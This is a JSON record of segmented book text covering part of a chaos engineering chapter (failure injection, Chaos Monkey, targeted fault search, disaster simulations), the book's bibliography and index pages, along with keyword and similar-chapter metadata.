      "concepts": [
        "systems",
        "monkey",
        "engineering",
        "engineer",
        "chaos",
        "concept",
        "different",
        "services",
        "change",
        "changing"
      ],
      "similar_chapters": [
        {
          "book": "Microservice Architecture",
          "chapter": 4,
          "title": "Segment 4 (pages 25-32)",
          "relevance_score": 0.59,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 2,
          "title": "Segment 2 (pages 9-17)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Machine Learning Systems An Iterative Process for Production-Ready Applications",
          "chapter": 3,
          "title": "Segment 3 (pages 18-25)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "Machine Learning Design Patterns",
          "chapter": 2,
          "title": "Segment 2 (pages 10-17)",
          "relevance_score": 0.58,
          "method": "sentence_transformers"
        },
        {
          "book": "AntiPatterns",
          "chapter": 1,
          "title": "Segment 1 (pages 2-12)",
          "relevance_score": 0.57,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 41,
      "title": "Segment 41 (pages 334-342)",
      "start_page": 334,
      "end_page": 342,
      "detection_method": "topic_boundary",
      "content": "Chapter 17. Chaos Engineering • 332\n\nWhen you have deep trees of service calls, your system may be vulnerable to loss of a whole service. Netflix uses failure injection testing (FIT) to inject more subtle failures.4 (Note that this is not the same “FIT” as the “framework for integrated testing” in Nonbreaking API Changes, on page 263.) FIT can tag a request at the inbound edge (at an API gateway, for example) with a cookie that says, “Down the line, this request is going to fail when service G calls service H.” Then at the call site where G would issue the request to H, it looks at the cookie, sees that this call is marked as a failure, and reports it as failed, without even making the request. (Netflix uses a common framework for all its outbound service calls, so it has a way to propagate this cookie and treat it uniformly.)\n\nNow we have three injections that can be applied in various places. We can kill an instance of any autoscaled cluster. We can add latency to any network connection. And we can cause any service-to-service call to fail. But which instances, connections, and calls are interesting enough to inject a fault? And where should we inject that fault?\n\nIntroducing Chaos to Your Neighbors by: Nora Jones , Senior Software Engineer and Coauthor of Chaos Engineering (O’Reilly, 2017)\n\nI was hired as the first and only person working on internal tools and developer productivity at a brand new e-commerce startup during a pivotal time. We had just launched the site, we were releasing code multiple times a day, and not to mention our marketing team was crushing it, so we already had several customers expecting solid performance and availability from the site from day one.\n\nThe lightning feature development speed led to a lack of tests and general caution, which ultimately led to precarious situations at times that were not ideal (read: being paged at 4 a.m. on a Saturday). About two weeks into my role at this company, my manager asked me if we could start experimenting with chaos engineering to help detect some of these issues before they became major outages. Given that I was new to the company and didn’t know all my col- leagues yet, I started this effort by sending an email to all the developers and business owners informing them we were beginning implementation of chaos engineering in QA and if they considered their services “unsafe to chaos” to let me know and they could opt out the first round. I didn’t get much response. After a couple weeks of waiting and nagging I assumed the silence implied consent and unleashed my armies of chaos. We ended up taking QA down for a week and I pretty much ended up meeting everyone that worked at the company. Moral of the story: chaos engineering is a quick way to meet your new colleagues, but it’s not a great way. Proceed with caution and control your failures delicately, especially when it’s the first time you’re enabling chaos.\n\n4.\n\nhttps://medium.com/netflix-techblog/fit-failure-injection-testing-35d8e2a9bb2\n\nreport erratum • discuss\n\nAdopting Your Own Monkey • 333\n\nTargeting Chaos\n\nYou could certainly use randomness. This is how Chaos Monkey works. It picks a cluster at random, picks an instance at random, and kills it. If you’re just getting started with chaos engineering, then random selection is as good a process as any. Most software has so many problems that shooting at ran- dom targets will uncover something alarming.\n\nOnce the easy stuff is fixed, you’ll start to see that this is a search problem. You’re looking for faults that lead to failures. Many faults won’t cause failures. In fact, on any given day, most faults don’t result in failures. (More about that later in this chapter.) When you inject faults into service-to-service calls, you’re searching for the crucial calls. As with any search problem, we have to confront the challenge of dimensionality.\n\nSuppose there’s a partner data load process that runs every Tuesday. A fault during one part of that process causes bad data in the database. Later, when using that data to present an API response, a service throws an exception and returns a 500 response code. How likely are you to find that problem via random search? Not very likely.\n\nRandomness works well at the beginning because the search space for faults is densely populated. As you progress, the search space becomes more sparse, but not uniform. Some services, some network segments, and some combina- tions of state and request will still have latent killer bugs. But imagine trying to exhaustively search a dimensional space, where n is the number of calls from service to service. In the worst case, if you have x services, there could be\n\n2n\n\n22x\n\npossible faults to inject!\n\nAt some point, we can’t rely just on randomness. We need a way to devise more targeted injections. Humans can do that by thinking about how a suc- cessful request works. A top-level request generates a whole tree of calls that support it. Kick out one of the supports, and the request may succeed or it may fail. Either way we learn something. This is why it’s important to study all the times when faults happen without failures. The system did something to keep that fault from becoming a failure. We should learn from those happy outcomes, just as we learn from the negative ones.\n\nAs humans, we apply our knowledge of the system together with abductive reasoning and pattern matching. Computers aren’t great at that, so we still have an edge when picking targets for chaos. (But see Cunning Malevolent Intelligence, on page 334, for some developing work.)\n\nreport erratum • discuss\n\nChapter 17. Chaos Engineering • 334\n\nCunning Malevolent Intelligence\n\nPeter Alvaro, a researcher at the University of California–Santa Cruz, works on prin- ciples for learning how to break systems by observing what they do well. It starts by collecting traces of normal workload. That workload will be subject to the usual daily stresses of production operations, but it isn’t deliberately perturbed by chaos engi- neering. (At least, not quite yet.)\n\nUsing those traces, it’s possible to build a database of inferences about what services a request type needs. That looks like a graph, so we can use graph algorithms to find links to cut with an experimentation platform. (See Automate and Repeat, on page 334, to read about ChAP, Netflix’s experimentation platform.) Once that link is cut, we may find that the request continues to succeed. Maybe there’s a secondary service, so we can see a new call that wasn’t previously active. That goes into the database, just like we humans would learn about the redundancy. There may not be a secondary call, but we just learn that the link we cut wasn’t that crucial after all.\n\nA few iterations of this process can drastically narrow down the search space. Peter calls this building a “cunning malevolent intelligence.” It can dramatically reduce the time needed to run productive chaos tests.\n\nAutomate and Repeat\n\nSo far, this sounds like an engineering lab course. Shouldn’t something called “chaos” be fun and exciting? No! In the best case, it’s totally boring because the system just keeps running as usual.\n\nAssuming we did find a vulnerability, things probably got at least a little exciting in the recovery stages. You’ll want to do two things once you find a weakness. First, you need to fix that specific instance of weakness. Second, you want to see what other parts of your system are vulnerable to the same class of problem.\n\nWith a known class of vulnerability, it’s time to find a way to automate testing. Along with automation comes moderation. There’s such a thing as too much chaos. If the new injection kills instances, it probably shouldn’t kill the last instance in a cluster. If the injection simulates a request failure between service G to service H, then it isn’t meaningful to simultaneously fail requests from G to every fallback it uses when H isn’t working!\n\nCompanies with dedicated chaos engineering teams are all building platforms that let them decide how much chaos to apply, when, to whom, and which services are off-limits. These make sure that one poor customer doesn’t get\n\nreport erratum • discuss\n\nDisaster Simulations • 335\n\nflagged for all the experiments at once! For example, Netflix calls its the “Chaos Automation Platform” (ChAP).5\n\nThe platform makes decisions about what injections to apply and when, but it usually leaves the “how” up to some existing tool. Ansible is a popular choice, since it doesn’t require a special agent on the targeted nodes. The platform also needs to report its tests to monitoring systems, so you can correlate the test events with changes in production behavior.\n\nDisaster Simulations\n\nChaos isn’t always about faults in the software. Things happen to people in our organizations, too. Every single person in your organization is mortal and fallible. People get sick. They break bones. They have family emergencies. Sometimes they just quit without notice. Natural disasters can even make a building or an entire city inaccessible. What happens when your single point of failure goes home every evening?\n\nHigh-reliability organizations use drills and simulations to find the same kind of systemic weaknesses in their human side as in the software side.\n\nIn the large, this may be a “business continuity” exercise, where a large portion of the whole company is involved. It’s possible to run these at smaller scales. Basically, you plan a time where some number of people are designated as “incapacitated.” Then you see if you can continue business as usual.\n\nYou can make this more fun by calling it a “zombie apocalypse simulation.” Randomly select 50 percent of your people and tell them they are counted as zombies for the day. They are not required to eat any brains, but they are required to stay away from work and not respond to communication attempts.\n\nAs with Chaos Monkey, the first few times you run this simulation, you’ll immediately discover some key processes that can’t be done when people are out. Maybe there’s a system that requires a particular role that only one person has. Or another person holds the crucial information about how to configure a virtual switch. During the simulation, record these as issues.\n\nAfter the simulation, review the issues, just like you would conduct a post- mortem on an outage. Decide how to correct for the gaps by improving docu- mentation, changing roles, or even automating a formerly manual process.\n\n5.\n\nhttps://medium.com/netflix-techblog/chap-chaos-automation-platform-53e6d528371f\n\nreport erratum • discuss\n\nChapter 17. Chaos Engineering • 336\n\nIt’s probably not a good idea to combine fault injections together with a zombie simulation for your very first run-through. But after you know you can survive a day of normal operations without people, ramp up the system stress by creating an abnormal situation while you’re at 20 percent zombiehood.\n\nOne final safety note: Be sure you have a way to abort the exercise. Make sure the zombies know a code word you can use to signal “this is not part of the drill,” in case a major situation comes up and you go from “learning opportunity” to “existential crisis.”\n\nWrapping Up\n\nChaos engineering starts with paradoxes. Stable systems become fragile. Dependencies creep in and failure modes proliferate whenever you turn your back on the software. We need to break things—regularly and in a semicon- trolled way—to make the software and the people who build it more resilient.\n\nreport erratum • discuss\n\nBibliography\n\n[AHV94]\n\nSerge Abiteboul, Richard Hull, and Victor Vianu. Foundations of Databases. Addison-Wesley, Boston, MA, 1994.\n\n[BC00]\n\nCarliss Y. Baldwin and Kim B. Clark. Design Rules. MIT Press, Cambridge, MA, 2000.\n\n[Chi01]\n\nJames R. Chiles. Inviting Disaster: Lessons From the Edge of Technology. Harper Business, New York, NY, 2001.\n\n[Fow03] Martin Fowler. Patterns of Enterprise Application Architecture. Addison-\n\nWesley Longman, Boston, MA, 2003.\n\n[FPK17]\n\nNeal Ford, Rebecca Parsons, and Pat Kua. Building Evolutionary Architec- tures. O’Reilly & Associates, Inc., Sebastopol, CA, 2017.\n\n[Goe06]\n\nBrian Goetz. Java Concurrency in Practice. Addison-Wesley, Boston, MA, 2006.\n\n[Gol04]\n\nEliyahu Goldratt. The Goal. North River Press, Great Barrington, MA, Third edition, 2004.\n\n[HF10]\n\nJez Humble and David Farley. Continuous Delivery: Reliable Software Releases Through Build, Test, and Deployment Automation. Addison-Wesley, Boston, MA, 2010.\n\n[HMO14]\n\nJez Humble, Joanne Molesky, and Barry O’Reilly. Lean Enterprise: How High Performance Organizations Innovate at Scale. O’Reilly & Associates, Inc., Sebastopol, CA, 2014.\n\n[KDWH16] Gene Kim, Patrick Debois, John Willis, and Jez Humble. The DevOps\n\nHandbook. IT Revolution Press, Portland, Oregon, 2016.\n\n[Ken98] William Kent. Data and Reality. 1st Books, Bloomington, IL, 1998.\n\nreport erratum • discuss\n\nBibliography • 338\n\n[Koz05]\n\nCharles Kozierok. The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference. No Starch Press, San Francisco, CA, 2005.\n\n[LW93]\n\nBarbara Liskov and J. Wing. Family Values: A Behavioral Notion Of Sub- typing. citeseer.ist.psu.edu/liskov94family.html. [MIT/LCS/TR-562b]:47, 1993.\n\n[Pet92]\n\nHenry Petroski. The Evolution of Useful Things. Alfred A. Knopf, Inc, New York, NY, 1992.\n\n[PP03]\n\nMary Poppendieck and Tom Poppendieck. Lean Software Development: An Agile Toolkit for Software Development Managers. Addison-Wesley, Boston, MA, 2003.\n\n[Rei09]\n\nDonald G. Reinertsen. The Principles of Product Development Flow: Second Generation Lean Product Development. Celeritas Publishing, Redondo Beach, CA, 2009.\n\n[She97] Michael Shermer. Why People Believe Weird Things. W.H.Freeman and\n\nCompany, New York, NY, 1997.\n\n[Sid11]\n\nSidney Sidney. Drift Into Failure. CRC Press, Boca Raton, FL, 2011.\n\n[Ste93]\n\nW. Richard Stevens. TCP/IP Illustrated, Volume 1: The Protocols. Addison- Wesley, Boston, MA, 1993.\n\n[Tal12]\n\nNassim Nicholas Taleb. Antifragile: Things That Gain From Disorder. Random House, New York, NY, 2012.\n\n[VCK96]\n\nJohn Vlissides, James O. Coplien, and Norman L. Kerth. Pattern Languages of Program Design 2. Addison-Wesley, Boston, MA, 1996.\n\n[Wei88]\n\nGerald M. Weinberg. General Principles of System Design. Dorset House, New York, NY, 1988.\n\nreport erratum • discuss\n\nDIGITS 12-factor app, 150–151 202 response code, back\n\npressure, 122\n\n403 Authentication Required response code, information leakage, 224\n\n5 a.m. problem, 38–43 503 Service Unavailable re-\n\nsponse code\n\nback pressure, 122 handshaking, 111 load shedding, 120, 184\n\nA abstraction\n\ndebugging integration\n\npoint failures, 36, 40, 43, 46\n\nivory tower architecture,\n\n5\n\nnetworks as, 36 sessions as, 58 sockets as, 36, 40\n\nactors\n\nback pressure, 121 let it crash pattern, 108–\n\n111\n\nadaptation, 289–324\n\nconcept leakage, 322 control of service identi-\n\nfiers, 316–318 convex returns, 290 create options, 307–313 decision cycle, 290–292 efficiency cautions, 300 embracing plurality, 321–\n\n322\n\nexplicit context, 306–\n\n307, 320\n\ninformation architecture,\n\n313–323\n\nloose clustering, 305 messages, events, and commands, 314–316 painless releases, 295 platform team, 292–294 process and organization,\n\n290–301\n\nservice extinction, 296–\n\n298\n\nsystem architecture, 301–\n\n313\n\nteam-scale autonomy,\n\n298\n\nthrashing, 292 URL dualism, 318–321\n\nadministration\n\n12-factor app checklist,\n\n151\n\nGUI interfaces, 131, 211 least privilege principle,\n\n231\n\nlive control API, 210 security misconfigura-\n\ntion, 225\n\nspecific network for ad- ministrative access, 145\n\nsplitting interfaces for se-\n\ncurity, 225\n\nadoption teams, 294 advanced persistent threat,\n\n60\n\nagile development, see al-\n\nso adaptation\n\nadoption teams, 294\n\nIndex\n\nadvantages, 4 change and, 289 decision loops, 291 airline case study, 9–21, 27–\n\n30, 98\n\nAkamai, 179 Akka, 108 aliases, service discovery with\n\nDNS, 173\n\nAlvaro, Peter, 334 Amazon Machine Images (AMIs), packaging, 245 Amazon Web Services (AWS) Code Pipeline, 243 concerns about dependen-\n\ncy on, 301\n\nin foundation layer, 152 Key Management Service\n\n(KMS), 226, 233\n\nS3 service outage, 195–\n\n197\n\nAmerican Registry for Internet Numbers (ARIN), 60, 285 AMIs (Amazon Machine Im- ages), packaging, 245\n\nAndera, Craig, 79 anti-CSRF token, 228 Antifragile, 328 antipatterns, stability,\n\nsee stability antipatterns\n\nApache httpd, 179 Apache Kafka, 315 API gateways, 227 APIs\n\nagreements, 264 API gateways, 227\n\nlive control API, 210 security, 230 timeouts, 92 unbounded result sets,\n\n88\n\nvendor API libraries and integration point fail- ures, 44\n\nversioning breaking\n\nchanges, 265, 268–270\n\nversioning nonbreaking changes, 263–268\n\nAPM, 200 AppDynamics, 200 application performance\n\nmanagement, 201\n\napplication-layer firewalls,\n\n227\n\napplication-specific custom\n\nheaders, 269\n\narchitecture\n\nadaptation and informa- tion architecture, 313– 323\n\nadaptation and system\n\narchitecture, 301–313\n\ncomponent-based, 302 event-based, 304 evolutionary, 296, 302–\n\n313\n\nlayered, 302–303 pragmatic vs. ivory tower,\n\n5\n\nservice-oriented, 101 shared-nothing, 70, 74 ARIN (American Registry for Internet Numbers), 60, 285\n\nassets, deployment, 255 assignment, 244 ATG-based infrastructure\n\npage request handling,\n\n133\n\nself-denial attacks, 70\n\nattack surface, 225 augmenting modular opera-\n\ntor, 310\n\nauthentication\n\ncontainers, 150 first-party, 221 number of attempts al-\n\nlowed, 220\n\nsecurity, 218–222 session fixation, 218 session prediction attack,\n\n219\n\nthird-party, 221\n\nautomation\n\nchaos engineering, 334 data collection for prob-\n\nlems, 12\n\ndeployment, 242–246 efficiency cautions, 301 force multiplier antipat- tern, 80–84, 123, 194 governor pattern, 123–\n\n125, 194\n\nHTTP APIs, 210 lack of judgment, 197 mapping, 246 speed of failure, 196 autonomy, team-scale, 298 autoscaling, see also scaling chain reactions, 49 costs, 52, 77, 202 force multiplier antipat- tern, 81, 123, 196 let it crash pattern, 110 pre-autoscaling, 71 self-denial attacks, 71 unbalanced capacities,\n\n77\n\nvirtual machines in the\n\ncloud, 153\n\nAWS, see Amazon Web Ser-\n\nvices (AWS)\n\nB back pressure\n\nwith load shedding, 120,\n\n122\n\nstability pattern, 120–123 unbalanced capacities,\n\n76\n\nbackoff algorithms, 80 backups\n\n12-factor app checklist,\n\n151\n\npartitioning traffic, 145 serialization and session failover in ecommerce case study, 287 Baldwin, Carliss Y., 308–313 bastion servers, 153 bell-curve distribution, 88 bidirectional certificates, 230 Big-IP, 180 binding\n\nports, 151 process binding, 100 black box technology, 165–\n\n169\n\nIndex • 340\n\nBlack Friday case study, 129–\n\n139, 163\n\nBlack Monday example, 86–\n\n89\n\nblacklists, 227 blocked threads, see threads,\n\nblocked\n\nblocking, scrapers and spi-\n\nders, 60, 285\n\nblue/green deployments, 295 bogons, 55, 185 bonding interfaces, 144 Bonnie 64, 147 broadcasts, 73 broken access control, 222–\n\n224\n\nbuffers, queue backups, 183 Building Evolutionary Architec-\n\ntures, 302\n\nbuilds\n\n12-factor app checklist,\n\n151\n\nbuild pipeline as continu- ous integration server, 243\n\ncontainer security, 232 deployment and build\n\npipeline, 243–247, 261 manual checks for deploy-\n\nment, 247\n\npackage repository, 208 security, 157, 208\n\nbulkheads\n\nAPI security, 230 physical redundancy as,\n\n98\n\nprocess binding, 100 splitting chain reactions,\n\n47, 49\n\nstability pattern, 98–101 unbalanced capacities,\n\n76\n\nbutterfly integration points\n\ndiagram, 33\n\nC C#, method synchronization,\n\n65\n\ncache busting, 255 caching\n\nblocked threads example,\n\n64–66\n\ncache busting, 255 cautions, 67 flushes, 105, 164, 210",
      "page_number": 334,
      "chapter_number": 41,
      "summary": "This chapter covers segment 41 (pages 334-342). Key topics include chaos, failure, and things.",
      "keywords": [
        "Chaos Engineering",
        "Chaos",
        "system",
        "Chaos Monkey",
        "request",
        "n’t",
        "Engineering",
        "report erratum",
        "service",
        "calls",
        "Things",
        "report",
        "Monkey",
        "failure",
        "Chaos Monkey works"
      ],
      "concepts": [
        "chaos",
        "failure",
        "things",
        "request",
        "requests",
        "services",
        "pressing",
        "press",
        "report",
        "randomly"
      ],
      "similar_chapters": [
        {
          "book": "Game Programming Gems 2",
          "chapter": 27,
          "title": "Segment 27 (pages 258-267)",
          "relevance_score": 0.56,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Engineering Building Applications",
          "chapter": 23,
          "title": "Segment 23 (pages 457-476)",
          "relevance_score": 0.55,
          "method": "sentence_transformers"
        },
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 31,
          "title": "Segment 31 (pages 262-269)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Agents In Action",
          "chapter": 7,
          "title": "Segment 7 (pages 50-57)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "AI Agents In Action",
          "chapter": 30,
          "title": "Segment 30 (pages 261-269)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 42,
      "title": "Segment 42 (pages 343-353)",
      "start_page": 343,
      "end_page": 353,
      "detection_method": "topic_boundary",
      "content": "invalidation strategy, 67,\n\n105\n\nleast recently used (LRU)\n\nalgorithms, 105\n\nlive control, 210 memory leaks, 105 memory limits, 67, 105 metrics, 206 monitoring hit rates, 67 proxies, 66 service discovery, 188 sessions, 58 shared resources scaling\n\neffects, 75\n\nstability problems, 105 weak references, 67 working-set algorithms,\n\n105 calendars, 129 canary deployments, 209,\n\n257, 295\n\nCAP theorem, 188 capacity\n\ncrushed ecommerce site case study, 284–288\n\ndefined, 52 demand control, 182–186 drift and, 327 judging load capacity by concurrent users, 281 judging load capacity by\n\nsessions, 281\n\nmodeling, 77 unbalanced capacities stability antipattern, 75–78, 112\n\nuser stability antipat-\n\nterns, 51–55 cascading failures\n\nblocked threads, 50, 68 chain reactions, 48 circuit breakers, 50, 98 fail fast pattern, 107 slow responses, 85 stability antipattern, 49–\n\n51\n\ntimeouts, 50, 94, 107\n\ncase studies\n\nabout, xiv airline, 9–21, 27–30, 98 Black Friday, 129–139,\n\n163\n\ncrushed ecommerce site,\n\n277–288\n\ndeployment army, 237–\n\n239\n\nusing postmortems, 14–\n\n18\n\ncatalog service example, 316–\n\n318\n\ncertificate revocation list\n\n(CRL), 227\n\ncertificates\n\nAPI security, 230 bidirectional, 230 certificate revocation list\n\n(CRL), 227\n\nproblems with, 219\n\nCERTs, 234 chain of custody, 157 chain reactions\n\nblocked threads, 48, 68 cascading failures, 48 splitting, 47, 49 stability antipattern, 46–\n\n49\n\nchannel partners and self-de-\n\nnial attacks, 70\n\nchannels, back pressure, 121 Chaos Automation Platform\n\n(ChAP), 334\n\nchaos engineering, 325–336 automation and repeti-\n\ntion, 334\n\ncautions, 332, 334 defined, 325 designing the experiment,\n\n331\n\ndisaster simulations, 335 environments, 325 injecting chaos, 331–332 precursors, 326–328 prerequisites, 330 Simian Army, 328–335 targeting chaos, 333 test harnesses, 116\n\nChaos Monkey, 328–335 ChAP (Chaos Automation\n\nPlatform), 334\n\nChiles, James R., 26, 32 Chrome, SameSite attribute,\n\n228\n\nCI, see continuous integration circuit breakers\n\nblocking scrapers and\n\nspiders, 60\n\ncascading failures, 50, 98 chain reactions, 49 distributed denial-of-ser- vice (DDoS) attacks, 61\n\nfail fast pattern, 106 generic gateways, 93 handshaking, 112\n\nIndex • 341\n\nintegration point failures,\n\n45–46, 98\n\nlet it crash pattern, 111 live control, 210 logging, 97 scope, 97 slow responses, 98 stability pattern, 95–98 thresholds, 96 with timeouts, 94, 98 unbalanced capacities,\n\n76, 98\n\nClark, Kim B., 308–313 classes, power-law distribu-\n\ntion, 304\n\ncleanup phase of deployment,\n\n259\n\nclocks and virtual machines,\n\n148 cloud\n\n12-factor app, 151 bulkheads, 99 certificate management,\n\n220\n\ncontainers in, 153 networking and founda- tion layer, 142–146 virtual machines in, 152\n\nCloudFoundry, 212 clustering\n\ncluster managers and\n\nvirtual machines, 148\n\nloose, 305 migratory virtual IP ad- dresses and cluster servers, 189\n\nSimian Army, 328–335 code, see also partitioning\n\nguidelines for, 157–160 native, 87 separating out log files,\n\n166\n\ncommand objects, 64 command queue, 211 command-query responsibili- ty segregation (CQRS), 64, 315\n\ncommands\n\nin information architec-\n\nture, 314–316 live control, 210\n\nCommon Weakness Enumer-\n\nation 22, 224 communication\n\nConway’s law, 279 decision cycle, 290–292\n\nefficiency concerns, 301 embracing plurality, 321–\n\n322\n\npoint-to-point communi- cation scaling effects, 72–73, 75\n\nself-denial attacks, 71 team-scale autonomy,\n\n298\n\ncompetitive intelligence, 59–\n\n60, 285\n\ncompliance requirements, log\n\nfiles, 104\n\ncomponent-based architec-\n\nture, 302 components\n\ncomponent-based archi-\n\ntecture, 302\n\nwith known vulnerabili-\n\nties, 229\n\nlet it crash pattern, 108–\n\n111\n\nrestarting in Recovery- Oriented Computing, 138\n\nconcept leakage, 322 concurrency\n\n12-factor app checklist,\n\n151\n\nchaos engineering, 326 Command Query Respon- sibility Separation, 64 synchronization of meth-\n\nods, 65 configuration\n\n12-factor app checklist,\n\n151\n\nconfiguration manage-\n\nment tools guidelines, 206–207\n\ndeployment and configu- ration management tools, 244\n\nwith disposable infras-\n\ntructure, 161\n\ndogpiles and configura-\n\ntion management tools, 79\n\nfiles, 160 guidelines for, 160–162 immutable infrastruc-\n\nture, 158\n\ninjection and containers,\n\n150\n\nlive control, 210 naming properties, 162\n\nparameters and implicit\n\ncontext, 307\n\nper-environment, 161 security, 161\n\nconnections\n\ndatabase connection pools and blocked threads, 64, 68\n\ndead connection detec-\n\ntion, 42\n\nduration of TCP, 40 live control, 210 metrics, 205 outbound, 146 queue backups, 183 test harnesses, 114–117\n\nconsensus, quorum-based,\n\n206\n\nconstraints and rollout, 260–\n\n261\n\nConsul, 172, 189 containers\n\nin cloud, 153 credentials, 150 data collection for debug-\n\nging, 152\n\ndiscovery services, 188 elastic scaling and deploy-\n\nment tools, 208\n\nin foundation layer, 146,\n\n149–153\n\nimmutable infrastruc-\n\nture, 159\n\nleast privilege principle,\n\n231\n\nload balancing, 150 log collectors, 204 log files, 166 packaging, 245 ports, 149 security, 225, 231 software-defined network-\n\ning, 187\n\ncontent-based routing, 181 context, implicit, 306 context, explicit, 306–307,\n\n320\n\nContinuous Delivery, 295 continuous deployment,\n\nsee deployment\n\ncontinuous integration build pipeline, 243 container security, 232\n\ncontract tests, 267, 272\n\nIndex • 342\n\ncontrol plane\n\nconfiguration services,\n\n206–207\n\ncontainers, 149–152 control plane layer, 141,\n\n193–214 costs, 194 defined, 193 development environ-\n\nment, 199\n\ndiscovery services, 189 force multiplier antipat-\n\ntern, 83–84\n\nin layer diagram, 141 level of, 193 live control, 209–212 platform and ecosystem,\n\n197–199\n\nplatform services, 212–\n\n213\n\nshopping list, 213 transparency, 200–206 virtual machines in the\n\ncloud, 152\n\ncontrollers, versioning API\n\nchanges, 270\n\nconvergence, 245, 257 conversion rate, 56 convex returns, 290 Conway’s law, 278–279 Conway, Melvin, 279 cookies\n\ncross-site request forgery\n\n(CSRF), 228 development, 58 exchanging session IDs,\n\n219\n\ngateway page, 286 pairing, 229 scrapers and spiders, 59–\n\n60\n\nsecurity, 58, 219 sticky sessions and load\n\nbalancers, 181\n\nunwanted user problems,\n\n57–60\n\ncoordinated deployments, 299 CORBA, 18 core dumps and password\n\nsecurity, 233\n\ncore facilities (CF) airline case study, 9–21, 27–30, 98\n\ncosts\n\nairline case study, 14 autoscaling, 52, 77, 202 caching, 67\n\ncontrol plane, 194 crushed ecommerce site\n\ncase study, 288\n\ndeployment, 239 designing for production,\n\n3\n\nload testing, 26 platforms, 202 poor stability, 23 real-user monitoring\n\n(RUM) services, 201\n\nreleases, 295 runtimes, 202 security, 215 transparency and econom-\n\nic value, 201\n\nunplanned operations,\n\n202\n\ncoupling, see also decoupling\n\nmiddleware\n\nairline case study, 28–29 avoiding with log files,\n\n165\n\nbulkheads, 99 coordinated deployments,\n\n299\n\ndesigning for transparen-\n\ncy, 164\n\nfailure propagation, 29,\n\n32\n\nhorizontal, 302 microservices, 303 porting and, 312 self-denial attacks, 70 white-box technology ,\n\n165\n\nCQRS (command-query re- sponsibility segregation), 64, 315\n\ncrashes, let it crash stability\n\npattern, 108–111\n\ncredentials, see authentica-\n\ntion; certificates; passwords\n\ncredit card tokenizer, 226 CRL (certificate revocation\n\nlist), 227\n\ncron jobs and dogpiles, 79 cross-site request forgery\n\n(CSRF), 228\n\ncross-site scripting (XSS),\n\n219, 221, 228\n\nCSRF (cross-site request\n\nforgery), 228\n\ncunning malevolent intelli-\n\ngence, 334\n\nCuriosity rover, 290\n\nCVEs, 229, 234 CWEs, 234\n\nD data, purging, 102, 107 data collection\n\nairline case study, 12,\n\n14–20\n\nautomated, 12 containers, 152 thread dumps, 16–18,\n\n135\n\ntransparency, 163–170 data encryption keys, 226,\n\n233\n\ndatabase administrators, role,\n\n198\n\ndatabases\n\nadministrator’s role, 198 cascading failures, 49 configuration services,\n\n206\n\nconfigured passwords,\n\n232\n\nconnection pools and\n\nblocked threads, 64, 68\n\nconstraints, 260–261 data purging, 102, 107 dead connection detec-\n\ntion, 42\n\ndeployment, 250–255,\n\n259–261\n\ndirect object access, 223 fail fast pattern, 106 implicit context, 307 injection vulnerabilities,\n\n216–218\n\nlive control, 210 metrics, 205 migrations frameworks,\n\n250, 260\n\nmigratory virtual IP ad-\n\ndresses, 190\n\nMongoDB hostage attack,\n\n225\n\nparadigm, 313 sensitive data exposure,\n\n226\n\nshims, 250, 259 translation pipeline, 252 trickle, then batch, 254–\n\n255\n\ntriggers, 250, 259 unbounded result sets,\n\n86–90, 94\n\nURL dualism, 318–321 URL probing, 223\n\nDatadog, 200\n\nIndex • 343\n\nDDoS (distributed denial-of-\n\nservice) attacks, 61\n\ndead connection detection, 42 deadlocks\n\nchain reactions, 49 connection pools, 68 timeouts, 69 vendor API libraries, 44\n\ndebug logs, 167 deceleration zones, 84 decision cycle, 290–292 decoupling middleware\n\nintegration point failures,\n\n45–46, 117\n\nself-denial attacks, 70 stability pattern, 117–119 total decoupling, 119\n\nDekker, Sidney, 327 delivery\n\navoiding thrashing, 292 continuous, 295 guidelines, 245\n\ndemand control, 182–186, see\n\nalso capacity\n\nDeming/Shewhart cycle, 291 denial attacks\n\ndistributed denial-of-ser- vice (DDoS) attacks, 61\n\nself-denial attacks, 69–\n\n71, 76 dependencies\n\n12-factor app checklist,\n\n151\n\ndependency on request,\n\n148\n\nhealth checks, 184 implicit, 306 loose clustering, 305 porting, 312 security, 158, 229 splitting modules, 308 team-scale autonomy,\n\n299\n\ntest harnesses, 116 URL dualism, 318\n\ndeployment\n\nassignment, 244 automated, 242–246 avoiding planned down-\n\ntime, 242\n\nblue/green deployments,\n\n295\n\nbuild pipeline and, 243–\n\n247, 261\n\ncache busting, 255\n\ncanary deployments,\n\n209, 257, 295\n\ncase study, 237–239 choices, 241 cleanup phase, 259 continuous, 246–260 convergence, 245, 257 coordinated deployments,\n\n299\n\ncosts, 239 databases, 250–255,\n\n259–261 defined, 156 delivery guidelines, 245 deployment services guidelines, 207\n\ndesigning for, 241–262 diagram, 156 drain period, 249 immutable infrastruc-\n\nture, 245\n\nmanual checks, 247 packaging, 245 painless releases, 295 phases, 248–260 placement services, 209 preparation, 248–257 risk cycle, 246 rolling, 248 rollout phase, 257–259 session affinity, 255 speed, 246, 248, 257 time-frame, 248–250 trickle, then batch, 254–\n\n255\n\nversioning, 255 in waves, 295 web assets, 255\n\nDesign Rules, 308 destination unreachable re-\n\nsponse, 187\n\ndevelopment environment\n\nquality of, 199 security, 208 DevOps, fallacy of, 294 The DevOps Handbook, 300 direct object access, 223 directory traversal attacks,\n\n224\n\ndisaster recovery\n\ndisaster simulations, 335 global server load balanc-\n\ning, 180\n\nhardware load balancing,\n\n180 discovery services DNS, 172–173\n\nforce multiplier antipat-\n\ntern, 81\n\nguidelines, 188 interconnection layer,\n\n172, 188\n\nopen-source, 172\n\ndisposability\n\n12-factor app checklist,\n\n151\n\nconfiguration, 161 immutable infrastruc-\n\nture, 158\n\ndistributed denial-of-service\n\n(DDoS) attacks, 61\n\nDNS\n\navailability of, 177 global server load balanc-\n\ning, 175–177\n\ninterconnection layer,\n\n173–177\n\nload balancing, 173–177 resolving hostnames, 143 round-robin load balanc-\n\ning, 173–174\n\nservice discovery with,\n\n172–173\n\nDocker 